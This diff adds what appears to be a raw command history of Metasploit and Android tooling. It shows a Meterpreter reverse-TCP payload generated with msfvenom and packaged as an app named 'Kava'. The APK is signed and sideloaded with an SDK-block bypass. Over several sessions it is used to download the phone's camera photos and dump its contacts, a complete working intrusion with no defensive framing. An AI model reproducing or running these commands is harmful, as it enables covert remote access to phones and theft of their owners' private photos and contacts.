@@ -1,0 +1,64 @@
+sessions -i
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=8080 -o Kava_New.apk
+apksigner sign --ks kava-key.keystore --out Kava_Final.apk Kava_New.apk
+keytool -genkey -v -keystore kava-new.keystore -alias kava -keyalg RSA -keysize 2048 -validity 10000
+apksigner sign --ks kava-new.keystore --out Kava_Final.apk Kava_New.apk
+adb install --bypass-low-target-sdk-block Kava_Final.apk
+set LPORT 8080
+set LHOST 0.0.0.0
+exploit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8080
+exploit -j
+sessions -i
+sessions -i 1
+jobs -l
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8080
+exploit -j
+jobs -l
+sessions -i 3
+download /sdcard/Download/ /sdcard/storage/external-1/
+termux-setup-storage
+#     
+set SESSION_COMMUNICATION_TIMEOUT 300
+set SESSION_RETRY_TOTAL 10
+#   
+sessions -i 1
+#            
+cd /sdcard/DCIM/Camera/
+ls
+#    
+download [_.jpg] /sdcard/storage/downloads/
+sessions -i 3
+download IMG_20260404_233135.jpg /sdcard/storage/downloads/
+download . /sdcard/storage/downloads/Kava_Photos/
+.sessions -i
+sessions -i
+jobs -l
+set payload android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8080
+exploit -j
+sessions -i 1
+#    meterpreter >  :
+download /sdcard/DCIM/Camera/IMG_20260404_233135.jpg /sdcard/storage/downloads/
+sessions -i 10
+download /sdcard/DCIM/Camera/IMG_20260404_233135.jpg .
+sessions -i 11
+sessions --interact 11 --timeout 60
+exploit -j
+sessions -i 12
+set SESSION_COMMUNICATION_TIMEOUT 60
+download /sdcard/DCIM/Camera/IMG_20260404_233135.jpg .
+dump_contacts
+sessions -i 11
